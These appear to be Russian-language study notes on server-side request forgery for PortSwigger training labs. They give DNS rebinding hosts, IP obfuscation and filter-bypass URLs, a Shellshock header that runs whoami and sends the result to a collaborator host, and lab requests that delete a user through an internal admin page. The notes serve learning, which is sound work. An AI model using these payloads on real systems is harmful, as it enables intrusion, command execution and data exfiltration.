## Введение

**Подделка запросов на стороне сервера (SSRF)** — это критическая уязвимость безопасности, позволяющая злоумышленникам манипулировать запросами на стороне сервера и потенциально получать доступ к конфиденциальным ресурсам или выполнять вредоносные действия.

Шаблоны атак: [PayloadsAllTheThings/Server Side Request Forgery](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)
Обходы валидации URL (Portswigger): [URL validation bypass cheat sheet for SSRF/CORS](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)

---

## Обход защиты чёрного списка

---

#### DNS rebinding

- `make-1.2.3.4-rebind-127.0-0.1-rr.1u.ms` 
  > Здесь можно менять "1.2.3.4" и "127.0.0.1" на любой другой. Резолвится в:
  > 1. 172.?.?.?
  > 2. 1.2.3.4
  
-  `double.terjanq.me`
  > Резолвится в:
  > 1. 127.0.0.1
  > 2. 51.38.138.162
- `7f000001.2223367c.rbndr.us`  
  >  Здесь адреса представлены в 16и-ричном виде в саб-доменах. Резолвится в:
  >  1. 127.0.0.1
  >  2. 34.35.54.124
- `spoofed.burpcollaborator.net` 
  > резолвится в 
  > 1. 127.0.0.1

DNS rebinding attack framework: [nccgroup/singularity](https://github.com/nccgroup/singularity)

---

#### Альтернативное представление IP-адреса

127.0.0.1:
1. 2130706433 - десятичная система счисления
2. 017700000001
3. 127.1
4. spoofed.burpcollaborator.net
5. localhost
6. 0177.0.0.1
7. \[::ffff:127:0:0:1]
8. 0.0.0.0

Инструмент для получения альтернативных представлений IP адреса: [IPFuscator](https://github.com/vysecurity/IPFuscator)

---

#### Другие варианты

1. URL-кодировки и разные варианты регистра
2. Замена https на http и наоборот

---

## Обход защиты белого списка

---

##### Вставка учётных данных в URL-адрес перед именем хоста, используя символ `@`

1. https://`ожидаемый-хост:какойтоПароль@`зловредный-хост

---

##### Использование символа `#` для обозначения якоря в URL

1. https://зловредный-хост`#ожидаемый-хост`

---

##### Использование иерархии DNS-имён, чтобы поместить необходимые входные данные в полное DNS-имя, которым можно управлять

1. https://`ожидаемый-хост.`зловредный-хост

---

##### URL кодировки

---

##### Всё вместе

1. http://localhost:80#@stock.weliketoshop.net/admin

---

##### Open redirect
`stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=1%26path=`http://192.168.0.68/admin

---

## Blind SSRF

Подробнее: [PayloadsAllTheThings/SSRF#blind-exploitation]([PayloadsAllTheThings/Server Side Request Forgery at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-exploitation))

#### Shell Shock
User-Agent: `() {:;}; $(whoami).burpcollaborator.net`
Referer: `http://192.168.0.$1$`

---

# Лабораторные

---

### Lab: SSRF with filter bypass via open redirection vulnerability

https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-filter-bypass-via-open-redirection#

```
POST /product/stock HTTP/2
Host: ***.web-security-academy.net
Content-Length: 109

stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
```



---
### Lab: Blind SSRF with out-of-band detection

https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-blind-ssrf-vulnerabilities/ssrf/blind/lab-out-of-band-detection#

```
GET /product?productId=1 HTTP/2
Host: ***.web-security-academy.net
Referer: https://*collaborator*/
```